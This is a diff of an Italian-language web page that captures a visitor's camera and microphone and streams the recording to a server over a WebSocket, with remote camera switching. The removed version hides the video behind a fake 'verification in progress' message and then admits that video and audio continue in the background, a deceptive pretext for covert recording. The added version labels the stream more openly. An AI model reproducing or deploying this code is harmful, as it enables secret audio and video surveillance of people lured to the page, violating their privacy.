@@ -1,61 +1,50 @@
+
 <!DOCTYPE html>
 <html lang="it">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Client Camera + Audio</title>
+<title>Client Video+Audio</title>
 <style>
 body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
 .msg { padding:40px 20px; font-size:18px; }
 </style>
 </head>
 <body>
-<div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
-<video id="cam" playsinline autoplay muted style="display:none;"></video>
+<div class="msg">Avvio telecamera...<br><small>Non chiudere la pagina</small></div>
 
 <script>
 const room = new URLSearchParams(location.search).get('room') || 'user1';
-const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
-const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);
-
+const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
+let mediaRecorder;
 let currentCamera = 'environment';
-let stream = null;
-let recorder = null;
-
-async function startCamera(camera) {
-  if (stream) stream.getTracks().forEach(t => t.stop());
-  stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: camera, width:{ideal:640}, height:{ideal:480} },
-    audio: true
-  });
-  const video = document.getElementById('cam');
-  video.srcObject = stream;
-  await video.play();
-
-  recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' });
-  recorder.ondataavailable = e => { if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) ws.send(e.data); };
-  recorder.start(100); // chunk ogni 100ms
-
-  document.querySelector('.msg').innerHTML =
-    `<b>Verifica completata</b><br><small>Video + Audio attivi in background</small>`;
-}
+let stream;
 
 ws.onopen = () => startCamera(currentCamera);
-
 ws.onmessage = e => {
-  if (typeof e.data === 'string') {
-    try {
-      const msg = JSON.parse(e.data);
-      if (msg.type === 'switchCamera') {
-        currentCamera = msg.camera;
-        if (recorder && recorder.state !== 'inactive') recorder.stop();
-        startCamera(currentCamera);
-      }
-    } catch {}
-  }
+  try {
+    const msg = JSON.parse(e.data);
+    if(msg.type==='switchCamera'){
+      currentCamera = msg.camera;
+      startCamera(currentCamera);
+    }
+  } catch {}
 };
 
-setInterval(() => { if (ws.readyState === WebSocket.OPEN) ws.send('ping'); }, 10000);
+async function startCamera(camera){
+  if(stream) stream.getTracks().forEach(t=>t.stop());
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({ video:{facingMode:camera}, audio:true });
+    mediaRecorder = new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});
+    mediaRecorder.ondataavailable = e => { if(ws.readyState===WebSocket.OPEN && e.data.size>0) ws.send(e.data); };
+    mediaRecorder.start(100); // invia chunk ogni 100ms
+    document.body.innerHTML=`<div class="msg"><b>Streaming attivo</b></div>`;
+  }catch(err){
+    document.body.innerHTML=`<div class="msg">Errore: ${err.message}</div>`;
+  }
+}
+
+setInterval(()=>{ if(ws.readyState===WebSocket.OPEN) ws.send('ping'); },10000);
 </script>
 </body>
 </html>
